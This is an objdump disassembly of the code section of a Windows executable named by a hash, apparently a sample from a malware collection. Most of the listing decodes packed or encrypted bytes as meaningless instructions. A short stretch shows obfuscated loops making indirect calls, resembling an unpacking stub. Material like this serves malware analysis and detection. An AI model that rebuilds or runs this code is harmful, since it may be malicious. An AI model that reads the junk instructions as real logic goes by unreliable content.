
2aa8be44ac5035bd871b7a7229fa69113f9b57924c41980172724e2b5a02da69.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	jmp    0x4013b4
  401008:	cwde   
  401009:	jb     0x400fd2
  40100b:	inc    eax
  40100c:	pop    ebp
  40100d:	pop    ebp
  40100e:	cdq    
  40100f:	retf   0xfa9e
  401012:	inc    ebp
  401013:	scas   eax,DWORD PTR es:[edi]
  401014:	loope  0x400ff4
  401016:	mul    DWORD PTR [esi+edi*2-0x7d818182]
  40101d:	jno    0x40109d
  40101f:	jle    0x400fef
  401021:	(bad)  
  401022:	xor    ecx,ebx
  401024:	xor    eax,0xccddcfdb
  401029:	ja     0x401033
  40102b:	or     ecx,DWORD PTR [edi]
  40102d:	hlt    
  40102e:	or     al,0xf
  401030:	cmp    ecx,DWORD PTR [edi]
  401032:	int3   
  401033:	adc    al,0x37
  401035:	sbb    al,0x1f
  401037:	mov    ch,0x54
  401039:	or     al,0xa7
  40103b:	ror    DWORD PTR [esi],1
  40103d:	out    dx,eax
  40103e:	mov    cl,0xd3
  401040:	(bad)  
  401041:	or     ecx,DWORD PTR [esi-0x550741ea]
  401047:	dec    ebp
  401048:	sbb    DWORD PTR [ecx+0x561fb6de],esp
  40104e:	loopne 0x4010bf
  401050:	add    ebx,DWORD PTR ds:0x4cc67490
  401056:	mov    ds:0xc8dd215b,al
  40105b:	xor    BYTE PTR [ecx-0x5c368c7e],ah
  401061:	jbe    0x40102b
  401063:	fisttp DWORD PTR [ebp+0x359cc6f5]
  401069:	jecxz  0x4010a7
  40106b:	and    ebp,0x4f
  40106e:	(bad)  
  40106f:	xchg   esi,eax
  401070:	dec    ebp
  401071:	inc    DWORD PTR [edi-0x2d5a886c]
  401077:	mov    cl,0x41
  401079:	loope  0x4010a1
  40107b:	pop    ecx
  40107c:	sub    edi,DWORD PTR [edx-0x4f61911e]
  401082:	jae    0x4010a1
  401084:	retf   
  401085:	call   0xe8ca:0x5ee3d82d
  40108c:	mov    ah,0xfc
  40108e:	loop   0x40102a
  401090:	cmp    eax,0xc76978cf
  401095:	sub    al,0xc1
  401097:	or     dl,ch
  401099:	sbb    eax,0xb39965d
  40109e:	outs   dx,DWORD PTR ds:[esi]
  40109f:	ins    DWORD PTR es:[edi],dx
  4010a0:	je     0x4010a6
  4010a2:	cmp    eax,0x24588ed1
  4010a7:	jns    0x401128
  4010a9:	pop    DWORD PTR ds:[edx]
  4010ac:	shl    DWORD PTR [esi-0x2ea6acfd],cl
  4010b2:	mov    BYTE PTR ds:0x15d550db,0x7d
  4010b9:	sahf   
  4010ba:	mov    dh,0x43
  4010bc:	daa    
  4010bd:	sbb    DWORD PTR [ebx],esp
  4010bf:	addr16 and eax,0x4f3edb12
  4010c5:	in     al,0xc1
  4010c7:	test   al,0xf6
  4010c9:	mov    cl,dl
  4010cb:	test   eax,0x4af12efd
  4010d0:	add    bh,dl
  4010d2:	cmc    
  4010d3:	xor    BYTE PTR [edi+ecx*2],cl
  4010d6:	mov    ah,0x65
  4010d8:	fstp   DWORD PTR [ebx+ebx*4+0x2ae1165a]
  4010df:	xchg   edx,eax
  4010e0:	adc    BYTE PTR [ecx],ah
  4010e2:	ja     0x4010e3
  4010e4:	nop
  4010e5:	lds    ebx,FWORD PTR [ebx-0x143fb1c7]
  4010eb:	jl     0x4010b8
  4010ed:	add    BYTE PTR [ebx-0x6d],bl
  4010f0:	call   0xeb184156
  4010f5:	retf   0xc417
  4010f8:	sub    al,0x37
  4010fa:	mov    al,ds:0x7b4f764
  4010ff:	dec    ebp
  401100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401101:	mov    ecx,0xa8f65cfc
  401106:	imul   edx,DWORD PTR [ecx+0x46],0x75
  40110a:	inc    ebx
  40110b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40110c:	jb     0x401104
  40110e:	loope  0x4010e3
  401110:	or     eax,0xfd7fc1eb
  401115:	repz mov ax,ds:0x42e67ae1
  40111c:	adc    ebp,edx
  40111e:	dec    ebp
  40111f:	or     eax,0x5a563cc
  401124:	xor    ch,0x72
  401127:	retf   
  401128:	stos   BYTE PTR es:[edi],al
  401129:	xchg   ebp,eax
  40112a:	enter  0xebef,0x2a
  40112e:	mov    eax,ds:0xd179382a
  401133:	sub    eax,DWORD PTR gs:[edi-0x2b6a8e5a]
  40113a:	aad    0xc2
  40113c:	sbb    dl,BYTE PTR [ecx+ebp*4-0x4c9095d6]
  401143:	addr16 out 0x4a,eax
  401146:	scas   eax,DWORD PTR es:[edi]
  401147:	popf   
  401148:	jge    0x401195
  40114a:	or     ebx,DWORD PTR [edi]
  40114c:	sbb    ecx,ecx
  40114e:	popa   
  40114f:	cmp    DWORD PTR [edx+0x47],0x1c
  401153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401154:	and    eax,0xf535a2ae
  401159:	in     eax,dx
  40115a:	in     eax,dx
  40115b:	dec    edi
  40115c:	xchg   edx,eax
  40115d:	ret    
  40115e:	(bad)  
  40115f:	mov    dh,0x3c
  401161:	arpl   WORD PTR [ebx+edx*4+0x272cfb6c],bx
  401168:	sbb    DWORD PTR [eax+0x3b],esp
  40116b:	adc    al,0x1a
  40116d:	stos   BYTE PTR es:[edi],al
  40116e:	cmp    ah,0xa
  401171:	test   eax,0xe53fff94
  401176:	call   FWORD PTR [edi+0x28]
  401179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40117a:	xor    al,0x49
  40117c:	mov    eax,ds:0x2f9b68c1
  401181:	shr    DWORD PTR [edx-0x43],1
  401184:	mov    esi,0xfa968547
  401189:	pop    esp
  40118a:	das    
  40118b:	dec    ebp
  40118c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40118d:	add    dh,al
  40118f:	repnz cwde 
  401191:	ins    BYTE PTR es:[edi],dx
  401192:	call   0x5655ef31
  401197:	aas    
  401198:	pushf  
  401199:	jb     0x40112d
  40119b:	mov    ah,0xfc
  40119d:	xor    BYTE PTR [esp+esi*2-0x5dd72cf7],ah
  4011a4:	xlat   BYTE PTR ds:[ebx]
  4011a5:	sub    BYTE PTR [ecx],dh
  4011a7:	aad    0xa
  4011a9:	test   DWORD PTR [ebx+0x3f],0xb60502bb
  4011b0:	sub    al,0xc6
  4011b2:	add    al,0xda
  4011b4:	mov    ecx,esp
  4011b6:	mov    dl,0xe2
  4011b8:	adc    BYTE PTR [eax],cl
  4011ba:	or     BYTE PTR [ebx+edx*2-0x7f],dh
  4011be:	mov    dh,0x7d
  4011c0:	sub    ch,BYTE PTR [edx]
  4011c2:	pop    ebx
  4011c3:	repnz lods al,BYTE PTR ds:[esi]
  4011c5:	imul   esp,DWORD PTR [edi+0x3d],0x5
  4011c9:	adc    BYTE PTR [ebx+0x64],bl
  4011cc:	mov    ah,BYTE PTR [esi+ecx*1+0x234177b6]
  4011d3:	enter  0x7f96,0x75
  4011d7:	inc    ebx
  4011d8:	ja     0x401169
  4011da:	pop    esp
  4011db:	jge    0x4011a6
  4011dd:	mov    ah,0x46
  4011df:	inc    esi
  4011e0:	or     BYTE PTR [edi],ch
  4011e2:	xor    eax,0xbbb54a92
  4011e7:	xor    eax,0xf449ca0d
  4011ec:	cmp    bh,BYTE PTR [edx]
  4011ee:	push   ss
  4011ef:	add    ebx,esp
  4011f1:	js     0x401250
  4011f3:	iret   
  4011f4:	mov    ds:0xdff738ff,eax
  4011f9:	ret    
  4011fa:	fcmovb st,st(7)
  4011fc:	or     bl,BYTE PTR [ecx+0x64]
  4011ff:	inc    esp
  401200:	pop    edx
  401201:	add    BYTE PTR [edx-0x7b],bh
  401204:	jecxz  0x4011bf
  401206:	jl     0x401207
  401208:	xor    ebx,DWORD PTR [edi+edx*4-0x6b]
  40120c:	(bad)  
  40120d:	idiv   BYTE PTR [eax+eax*2]
  401210:	cmp    cl,BYTE PTR [ebx]
  401212:	stc    
  401213:	and    al,0x4b
  401215:	xchg   ecx,eax
  401216:	and    DWORD PTR [ecx-0x4d7fbec6],edx
  40121c:	inc    esp
  40121d:	(bad)  [ebp-0x40]
  401220:	ja     0x40123f
  401222:	jp     0x401222
  401224:	sub    DWORD PTR [edx+0x23d6580c],0x2d
  40122b:	cs and al,0xf1
  40122e:	sub    ebp,edi
  401230:	inc    eax
  401231:	call   0x2dda:0xd7aef664
  401238:	retf   
  401239:	add    dl,BYTE PTR [eax]
  40123b:	mov    cl,0xce
  40123d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40123e:	pop    esp
  40123f:	sar    DWORD PTR [edi+0x31],0x8c
  401243:	mov    al,ds:0x5febbfb2
  401248:	in     eax,dx
  401249:	jns    0x401276
  40124b:	and    BYTE PTR [eax],bl
  40124d:	jge    0x401288
  40124f:	jge    0x40127a
  401251:	retf   
  401252:	add    eax,0x4d0044c6
  401257:	xor    esi,DWORD PTR [ebx-0x17321e1c]
  40125d:	xor    eax,DWORD PTR [edi]
  40125f:	rcl    DWORD PTR [eax+0x16],0x13
  401263:	aaa    
  401264:	jmp    0x53a873e3
  401269:	mov    cl,0xf5
  40126b:	icebp  
  40126c:	mov    edx,0x8e0e5a19
  401271:	fistp  DWORD PTR [edx-0x43091e3a]
  401277:	dec    eax
  401278:	std    
  401279:	or     eax,DWORD PTR [ecx-0xbbe4e32]
  40127f:	xchg   DWORD PTR [eax+0x68c5e819],eax
  401285:	fidiv  WORD PTR [edx+0xd8335ab]
  40128b:	inc    ecx
  40128c:	mov    ebp,0xefbe3f6f
  401291:	jo     0x401223
  401293:	xor    al,0x89
  401295:	pop    esp
  401296:	xor    al,0x60
  401298:	xchg   edx,eax
  401299:	and    eax,0xd37a0e43
  40129e:	cld    
  40129f:	sub    BYTE PTR [eax-0x67],0x1d
  4012a3:	fst    QWORD PTR [edi-0xd]
  4012a6:	enter  0x25b2,0xfe
  4012aa:	jg     0x401320
  4012ac:	sbb    BYTE PTR [edi-0x2e1d6947],0x98
  4012b3:	inc    edx
  4012b4:	sahf   
  4012b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012b6:	xor    al,0xbf
  4012b8:	and    DWORD PTR [ebx+0x7b],0xd4b5e4b
  4012bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012c0:	jl     0x4012a0
  4012c2:	cmp    DWORD PTR [ebx+0x36e9225],edi
  4012c8:	sar    DWORD PTR [ebp-0x5bdad664],0x6f
  4012cf:	inc    esp
  4012d0:	jae    0x4012ee
  4012d2:	push   eax
  4012d3:	test   eax,0x58de2307
  4012d8:	xchg   ebx,eax
  4012d9:	cmc    
  4012da:	jmp    0x655bd677
  4012df:	sub    al,0xdf
  4012e1:	into   
  4012e2:	rcl    esp,1
  4012e4:	xor    eax,ecx
  4012e6:	add    eax,0xe3c4562b
  4012eb:	xor    al,dh
  4012ed:	mov    al,ds:0x937a1c4
  4012f2:	sbb    ebp,eax
  4012f4:	add    eax,eax
  4012f6:	xchg   esp,eax
  4012f7:	retf   0x4a2f
  4012fa:	pop    es
  4012fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4012fc:	out    dx,eax
  4012fd:	fsub   QWORD PTR [eax]
  4012ff:	or     bl,al
  401301:	outs   dx,DWORD PTR ds:[esi]
  401302:	xor    al,0xb6
  401304:	sbb    eax,eax
  401306:	mov    bl,BYTE PTR [esi-0x4d9efec0]
  40130c:	dec    ebp
  40130d:	sub    al,0x4d
  40130f:	sub    eax,0x1ecd33ec
  401314:	(bad)  
  401316:	fmul   st,st(1)
  401318:	js     0x4012f1
  40131a:	mov    bl,0x1f
  40131c:	push   edi
  40131d:	push   cs
  40131e:	pop    edi
  40131f:	sub    al,0xff
  401321:	add    eax,0x6f3ce1ba
  401326:	outs   dx,DWORD PTR ds:[esi]
  401327:	mov    ah,0x42
  401329:	es cs jmp 0x7e0d7d6a
  401330:	stos   DWORD PTR es:[edi],eax
  401331:	aad    0xdd
  401333:	jmp    0xbf1f:0xd4b24049
  40133a:	fisttp DWORD PTR [ecx+0x17]
  40133d:	repnz fmul st(5),st
  401340:	pop    ss
  401341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401342:	dec    ebx
  401343:	cwde   
  401344:	pop    ebx
  401345:	fs int3 
  401347:	ret    
  401348:	cmp    esi,DWORD PTR [esi+0x57001d31]
  40134e:	push   ebx
  40134f:	lock or al,0x7a
  401352:	adc    eax,0xb0dbdb59
  401357:	xchg   esp,eax
  401358:	sbb    DWORD PTR [ebx-0x41],edi
  40135b:	jecxz  0x401358
  40135d:	in     al,0x9b
  40135f:	jp     0x40130b
  401361:	add    eax,0x3036a061
  401366:	mov    esp,0xa0a08cfa
  40136b:	add    esp,DWORD PTR [ebp-0x325456be]
  401371:	pusha  
  401372:	fistp  WORD PTR [eax-0x4bde1dd1]
  401378:	shrd   DWORD PTR [esi-0x7ed4cbb0],esp,cl
  40137f:	inc    eax
  401380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401381:	stos   DWORD PTR es:[edi],eax
  401382:	clc    
  401383:	mov    gs,edx
  401385:	ja     0x401379
  401387:	adc    eax,0xb969200f
  40138c:	push   esi
  40138d:	jne    0x4013fd
  40138f:	(bad)  
  401391:	push   ecx
  401392:	mov    edi,0x1eeb8301
  401397:	sbb    al,al
  401399:	sbb    esp,DWORD PTR [ecx-0x4ae0a915]
  40139f:	pop    ss
  4013a0:	arpl   WORD PTR [edi+0x71867d3d],sp
  4013a6:	test   BYTE PTR [esi+eiz*2-0x7],al
  4013aa:	sub    BYTE PTR [esi+0x78],0x84
  4013ae:	cli    
  4013af:	call   DWORD PTR [edi]
  4013b1:	mov    edi,0xec835d32
  4013b6:	sub    al,0xc7
  4013b8:	inc    ebp
  4013b9:	clc    
  4013ba:	xor    al,BYTE PTR [ebp+0x3d19f89c]
  4013c0:	push   es
  4013c1:	push   es
  4013c2:	inc    ebx
  4013c3:	add    bh,al
  4013c5:	inc    ebp
  4013c6:	in     al,dx
  4013c7:	xor    eax,0x2bf89c85
  4013cc:	enter  0x7b8,0x95
  4013d0:	add    BYTE PTR [eax],al
  4013d2:	mov    WORD PTR [ebp-0x4],ax
  4013d6:	mov    DWORD PTR ds:0x42efa0,0x1f
  4013e0:	cmp    DWORD PTR ds:0x42efa0,0x0
  4013e7:	je     0x40141b
  4013ed:	cmp    DWORD PTR ds:0x42efa0,0x27
  4013f4:	jne    0x401403
  4013fa:	push   DWORD PTR [ebp-0x1c]
  4013fd:	call   DWORD PTR ds:0x42eb6c
  401403:	mov    ecx,DWORD PTR ds:0x42efa0
  401409:	dec    ecx
  40140a:	mov    DWORD PTR ds:0x42efa0,ecx
  401410:	jmp    0x4013e0
  401415:	sub    ecx,DWORD PTR ds:0x42efa4
  40141b:	lea    eax,[ebp-0x24]
  40141e:	mov    DWORD PTR ds:0x4306d6,0x15
  401428:	cmp    DWORD PTR ds:0x4306d6,0x0
  40142f:	je     0x401491
  401435:	cmp    DWORD PTR ds:0x4306d6,0x9
  40143c:	jne    0x40145f
  401442:	push   DWORD PTR [ebp-0x28]
  401445:	push   0x42e965
  40144a:	push   0x78ed
  40144f:	push   0x520a
  401454:	push   0x5250
  401459:	call   DWORD PTR ds:0x42eb70
  40145f:	cmp    DWORD PTR ds:0x4306d6,0xa
  401466:	jne    0x401479
  40146c:	mov    ecx,DWORD PTR ds:0x4306d6
  401472:	dec    ecx
  401473:	mov    DWORD PTR ds:0x4306d6,ecx
  401479:	mov    ecx,DWORD PTR ds:0x4306d6
  40147f:	dec    ecx
  401480:	mov    DWORD PTR ds:0x4306d6,ecx
  401486:	jmp    0x401428
  40148b:	and    ecx,DWORD PTR ds:0x43061a
  401491:	mov    DWORD PTR [ebp-0x28],eax
  401494:	and    ecx,ecx
  401496:	mov    eax,DWORD PTR [ebp+0x8]
  401499:	jmp    0x40184a
  40149e:	sub    ch,BYTE PTR [esi+0x5aba4a9e]
  4014a4:	jmp    0xd850:0xc48b26e
  4014ab:	fcomi  st,st(7)
  4014ad:	fadd   DWORD PTR [edx-0x7d81818f]
  4014b3:	jno    0x401533
  4014b5:	jle    0x401489
  4014b7:	mov    edx,0xf6ab3e4b
  4014bc:	pop    esi
  4014bd:	and    al,BYTE PTR [esi]
  4014bf:	push   cs
  4014c0:	and    BYTE PTR [edx-0x69],bl
  4014c3:	loop   0x40152a
  4014c5:	jmp    edx
  4014c7:	mov    edx,0x1726c4ff
  4014cc:	inc    edx
  4014cd:	mov    esp,ss
  4014cf:	inc    esp
  4014d0:	or     DWORD PTR [ecx-0x25],edx
  4014d3:	bound  edi,QWORD PTR [edx+0x0]
  4014d6:	mov    eax,0xde63332d
  4014db:	adc    bh,BYTE PTR [esi+0x2afb4bf]
  4014e1:	mov    edx,0xe3c7d406
  4014e6:	or     DWORD PTR [edx+0xbb5b516],esp
  4014ec:	lods   eax,DWORD PTR ds:[esi]
  4014ed:	jne    0x40156e
  4014ef:	and    ecx,DWORD PTR [edx+0xa]
  4014f2:	push   ebx
  4014f3:	cmp    DWORD PTR [ecx-0x20],eax
  4014f6:	add    eax,0x67775ea7
  4014fb:	mov    ss,WORD PTR [esi+0x22]
  4014fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014ff:	pop    esp
  401500:	aas    
  401501:	pop    eax
  401502:	test   al,0x20
  401504:	sub    edx,ebp
  401506:	jmp    0x4014b7
  401508:	add    eax,0x8d6745d3
  40150d:	adc    ebx,DWORD PTR [edx-0x79]
  401510:	(bad)  
  401511:	jo     0x401588
  401513:	mov    esi,0xccb9138e
  401518:	xor    cl,bl
  40151a:	fsubr  DWORD PTR [edi-0x68]
  40151d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40151e:	int3   
  40151f:	jg     0x401516
  401521:	pop    ebx
  401522:	pusha  
  401523:	int    0xbc
  401525:	inc    edx
  401526:	jnp    0x4014ce
  401528:	js     0x4014ce
  40152a:	sbb    dl,BYTE PTR [edi-0x4e]
  40152d:	fsubp  st(6),st
  40152f:	jle    0x4014cd
  401531:	pop    ecx
  401532:	icebp  
  401533:	scas   eax,DWORD PTR es:[edi]
  401534:	or     edi,eax
  401536:	mov    ds:0xe02c5759,al
  40153b:	or     al,bl
  40153d:	xor    edi,esi
  40153f:	aad    0xfb
  401541:	loope  0x40154b
  401543:	aam    0x4d
  401545:	popa   
  401546:	fmul   QWORD PTR [ebx-0x56a9af95]
  40154c:	jp     0x4014da
  40154e:	iret   
  40154f:	mov    edx,DWORD PTR fs:[edx-0x151d2e]
  401556:	sub    eax,0x107201fa
  40155b:	xor    bl,BYTE PTR [ebp+0x745a4086]
  401561:	sub    ch,dl
  401563:	adc    bl,bl
  401565:	inc    ebx
  401566:	aaa    
  401567:	mov    esi,0x7ab3402
  40156c:	sub    eax,0xc6d15e09
  401571:	mov    al,0x1c
  401573:	fadd   DWORD PTR [edx-0x2cfd58a1]
  401579:	outs   dx,BYTE PTR ds:[esi]
  40157a:	leave  
  40157b:	push   esp
  40157c:	ds aas 
  40157e:	inc    ecx
  40157f:	in     eax,dx
  401580:	ss repnz xchg esp,eax
  401583:	fidivr DWORD PTR [esi]
  401585:	xchg   ebx,eax
  401586:	or     ecx,0x21a1dc07
  40158c:	dec    esp
  40158d:	(bad)
  401590:	adc    bh,BYTE PTR [edi]
  401592:	jns    0x401567
  401594:	out    dx,al
  401595:	push   0x3a074a82
  40159a:	inc    eax
  40159b:	or     DWORD PTR [eax+0xf1e3750],ebp
  4015a1:	aad    0x40
  4015a3:	push   ebp
  4015a4:	sbb    BYTE PTR [edx-0x7ba2a450],ah
  4015aa:	loope  0x40155d
  4015ac:	(bad)  
  4015ad:	sbb    eax,0x70fbb1a9
  4015b2:	nop
  4015b3:	or     esi,edx
  4015b5:	es push ss
  4015b7:	scas   eax,DWORD PTR es:[edi]
  4015b8:	scas   al,BYTE PTR es:[edi]
  4015b9:	mov    BYTE PTR [esi],al
  4015bb:	inc    ebp
  4015bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015bd:	imul   ebp,DWORD PTR [edx+0x10],0x9cc644c6
  4015c4:	push   ss
  4015c5:	rcl    DWORD PTR [edi+0x28],cl
  4015c8:	pop    eax
  4015c9:	xchg   edx,eax
  4015ca:	jb     0x401609
  4015cc:	jae    0x4015c4
  4015ce:	push   ds
  4015cf:	pop    ss
  4015d0:	dec    ebp
  4015d1:	push   esp
  4015d2:	pop    ecx
  4015d3:	popa   
  4015d4:	outs   dx,BYTE PTR ds:[esi]
  4015d5:	and    BYTE PTR [edi+0x24],bl
  4015d8:	or     eax,0x6974636a
  4015dd:	push   0xffffff9d
  4015df:	cmp    al,0x3f
  4015e1:	jns    0x4015f5
  4015e3:	std    
  4015e4:	loop   0x4015a6
  4015e6:	scas   eax,DWORD PTR es:[edi]
  4015e7:	loop   0x401629
  4015e9:	add    al,0x7
  4015eb:	enter  0xef78,0xdc
  4015ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015f0:	or     bh,BYTE PTR [ebp+0x56ea0e55]
  4015f6:	shl    BYTE PTR [edi+0x2f],cl
  4015f9:	xlat   BYTE PTR ds:[ebx]
  4015fa:	fcomi  st,st(0)
  4015fc:	neg    BYTE PTR [edx]
  4015fe:	rcr    DWORD PTR [ebx+ecx*8+0x60f6ae61],1
  401605:	sub    edx,DWORD PTR [edi+0x30d3c101]
  40160b:	out    dx,eax
  40160c:	retf   0xcce0
  40160f:	(bad)  
  401610:	pushf  
  401611:	cs xchg esp,eax
  401613:	mov    edi,0xaebf0894
  401618:	into   
  401619:	out    0x0,eax
  40161b:	xor    edx,edx
  40161d:	outs   dx,DWORD PTR ds:[esi]
  40161e:	sub    cl,BYTE PTR [eax+0x74cd7f87]
  401624:	stos   DWORD PTR es:[edi],eax
  401625:	mul    BYTE PTR [ebx]
  401627:	test   eax,0x89914cf
  40162c:	popf   
  40162d:	das    
  40162e:	sub    dh,0xc4
  401631:	dec    esi
  401632:	pop    es
  401633:	pop    ebx
  401634:	inc    edi
  401635:	xor    BYTE PTR [edi+0x2f5d26f5],ah
  40163b:	xlat   BYTE PTR ds:[ebx]
  40163c:	cmp    eax,0x5951f4bb
  401641:	xor    BYTE PTR [ebx],dh
  401643:	pop    ebx
  401644:	stos   BYTE PTR es:[edi],al
  401645:	push   0x790cbdb3
  40164a:	mov    al,0xc8
  40164c:	mov    eax,0x4635f2d9
  401651:	jo     0x4016b8
  401653:	sbb    DWORD PTR [ecx],edi
  401655:	or     al,0xfc
  401657:	ins    BYTE PTR es:[edi],dx
  401658:	mov    dl,0x59
  40165a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40165b:	fistp  DWORD PTR [ebx-0x5f3b7c7]
  401661:	or     eax,0xde91475c
  401666:	push   esi
  401667:	fst    st(7)
  401669:	dec    ebp
  40166a:	outs   dx,DWORD PTR ds:[esi]
  40166b:	and    ecx,DWORD PTR [ecx]
  40166d:	xchg   edx,eax
  40166e:	mov    bh,0x63
  401670:	inc    ebx
  401671:	(bad)  
  401672:	push   edi
  401673:	das    
  401674:	gs clc 
  401676:	test   DWORD PTR [ebp+edi*4-0x6cd1d9c],esp
  40167d:	bound  eax,QWORD PTR [ebp+0x29379297]
  401683:	lea    edx,[edx+0x4e223a8]
  401689:	fstp   QWORD PTR [edi]
  40168b:	shl    BYTE PTR [eax+edi*4+0x35],0x77
  401690:	inc    ebx
  401691:	add    BYTE PTR [ebp-0x65],bl
  401694:	std    
  401695:	pop    eax
  401696:	xchg   ebx,eax
  401697:	mov    bl,0xb7
  401699:	push   eax
  40169a:	add    al,0xb3
  40169c:	mov    bh,0xde
  40169e:	sbb    ecx,DWORD PTR [ebx+0x241215fb]
  4016a4:	sub    bl,dh
  4016a6:	xor    al,0x4e
  4016a8:	and    DWORD PTR [edi+0x48],edx
  4016ab:	imul   edx,DWORD PTR [edi]
  4016ae:	pop    ss
  4016af:	sub    DWORD PTR [ebx+edi*2-0x273261ae],esp
  4016b6:	dec    edi
  4016b7:	(bad)  
  4016b8:	shl    DWORD PTR [ecx],cl
  4016ba:	test   bl,dl
  4016bc:	(bad)  
  4016be:	or     al,0xb6
  4016c0:	xchg   ebp,eax
  4016c1:	lea    ecx,cs:[eax+0x37]
  4016c5:	leave  
  4016c6:	in     al,0x99
  4016c8:	push   edx
  4016c9:	xchg   ebx,eax
  4016ca:	sub    al,0xda
  4016cc:	cmp    DWORD PTR [esi-0x7e],0x76d80e64
  4016d3:	jae    0x4016c5
  4016d5:	aas    
  4016d6:	imul   esp,DWORD PTR [edx],0x7b
  4016d9:	ds mov ebp,0xc2c638fc
  4016df:	add    esp,ebp
  4016e1:	lahf   
  4016e2:	xchg   edi,eax
  4016e3:	pop    eax
  4016e4:	outs   dx,BYTE PTR ds:[esi]
  4016e5:	bound  ecx,QWORD PTR [edi-0x7b3c6c]
  4016eb:	and    dl,BYTE PTR [ebx+0xdbf3ed6]
  4016f1:	adc    bl,al
  4016f3:	imul   eax,DWORD PTR ds:0x7e7583c,0x1a
  4016fa:	aaa    
  4016fb:	rcr    BYTE PTR [edi+ebp*8-0x479843c0],1
  401702:	add    BYTE PTR [ecx+0x61],bl
  401705:	pop    esi
  401706:	in     eax,dx
  401707:	sti    
  401708:	dec    ebx
  401709:	(bad)  
  40170a:	outs   dx,BYTE PTR ds:[esi]
  40170b:	in     eax,0x43
  40170d:	or     edi,DWORD PTR [edx-0x38]
  401710:	dec    eax
  401711:	sahf   
  401712:	sbb    eax,0x64d2bd89
  401717:	push   esp
  401718:	fs jb  0x4016c6
  40171b:	sahf   
  40171c:	test   eax,0xe97ebe0b
  401721:	and    BYTE PTR [ecx-0x46f58e7a],dl
  401727:	mov    al,ds:0xb5713f98
  40172c:	pop    ds
  40172d:	loopne 0x401791
  40172f:	xor    BYTE PTR [edi+0x2aa1a231],bl
  401735:	inc    esp
  401736:	xor    esi,esp
  401738:	mov    edi,0x5e2115cb
  40173d:	lahf   
  40173e:	inc    ebp
  40173f:	xor    BYTE PTR [edi],bh
  401741:	jp     0x40172f
  401743:	lds    esp,FWORD PTR [ebx+0x181edc30]
  401749:	cmp    BYTE PTR [edx-0x75],0x67
  40174d:	adc    dl,bh
  40174f:	cmp    esi,DWORD PTR [eax+0xee2ab5d]
  401755:	push   0x6d32970a
  40175a:	inc    eax
  40175b:	test   DWORD PTR [ecx],ecx
  40175d:	fisttp QWORD PTR [esi+eiz*4+0x1dd62bbe]
  401764:	lods   eax,DWORD PTR ds:[esi]
  401766:	mov    ecx,0xf4fd889b
  40176b:	cli    
  40176c:	aaa    
  40176d:	cmc    
  40176e:	push   ebx
  40176f:	push   0x3ccfa4e7
  401774:	repz sbb al,al
  401777:	fnstsw WORD PTR [esi-0x6de10bb0]
  40177d:	or     eax,0x17fcd242
  401782:	xor    DWORD PTR [edx],ecx
  401784:	jmp    0x35b02281
  401789:	or     al,0x26
  40178b:	sbb    BYTE PTR [edi+0x12],cl
  40178e:	sub    ebx,0xbde6d5a6
  401794:	loope  0x4017da
  401796:	sub    bh,BYTE PTR ds:[edi]
  401799:	arpl   WORD PTR [edx-0x2df1bbd0],bx
  40179f:	jl     0x40173a
  4017a1:	dec    ebp
  4017a2:	into   
  4017a3:	add    bl,BYTE PTR [edx+ecx*1]
  4017a6:	mov    ebx,0x5d53404d
  4017ab:	dec    ebp
  4017ac:	icebp  
  4017ad:	(bad)  
  4017ae:	clc    
  4017af:	dec    edi
  4017b0:	push   ss
  4017b1:	xor    BYTE PTR ds:0x11c2eec3,dh
  4017b7:	push   eax
  4017b8:	clc    
  4017b9:	gs test eax,0xf3013027
  4017bf:	sub    al,0xdc
  4017c1:	pop    ecx
  4017c2:	and    DWORD PTR [esi],ebp
  4017c4:	and    DWORD PTR [eax+0x7a],edi
  4017c7:	jl     0x40174a
  4017c9:	jp     0x40180a
  4017cb:	in     eax,dx
  4017cc:	leave  
  4017cd:	into   
  4017ce:	sub    al,0x23
  4017d0:	stos   BYTE PTR es:[edi],al
  4017d1:	jmp    0x46ce:0x9a8f8c34
  4017d8:	fwait
  4017d9:	mov    BYTE PTR [edi],0xc0
  4017dc:	sbb    eax,0xca71e739
  4017e1:	inc    ebx
  4017e2:	in     al,dx
  4017e3:	sub    eax,0x4820a761
  4017e8:	push   es
  4017e9:	inc    esp
  4017ea:	mov    ch,0x4
  4017ec:	aas    
  4017ed:	fisubr WORD PTR [ebp+0x2a2a03c7]
  4017f3:	rol    DWORD PTR [ecx+ecx*2+0x2],cl
  4017f7:	xchg   edi,eax
  4017f8:	lock xchg edx,eax
  4017fa:	mov    dh,0x39
  4017fc:	cmp    BYTE PTR [eax+ecx*2],al
  4017ff:	imul   ebp,edi,0x8c4de5d0
  401805:	dec    esp
  401806:	in     eax,dx
  401807:	out    0x4b,eax
  401809:	lea    esp,[edi-0x80]
  40180c:	retf   0x38ea
  40180f:	shl    dh,cl
  401811:	inc    ebx
  401812:	xlat   BYTE PTR ds:[ebx]
  401813:	ret    0x1fc
  401816:	idiv   DWORD PTR [ebx-0x1b]
  401819:	and    ebx,ebx
  40181b:	imul   edi,edi,0xffffffae
  40181e:	pop    ebx
  40181f:	cwde   
  401820:	xor    al,0xa8
  401822:	sub    ebp,DWORD PTR [eax]
  401824:	retf   
  401825:	fs xchg esp,eax
  401827:	shr    dh,1
  401829:	push   ebp
  40182a:	lods   eax,DWORD PTR ds:[esi]
  40182b:	in     al,0xb2
  40182d:	outs   dx,DWORD PTR ds:[esi]
  40182e:	cmp    esp,DWORD PTR [ebx]
  401830:	shr    BYTE PTR [esi+0x17],1
  401833:	out    dx,al
  401834:	repnz das 
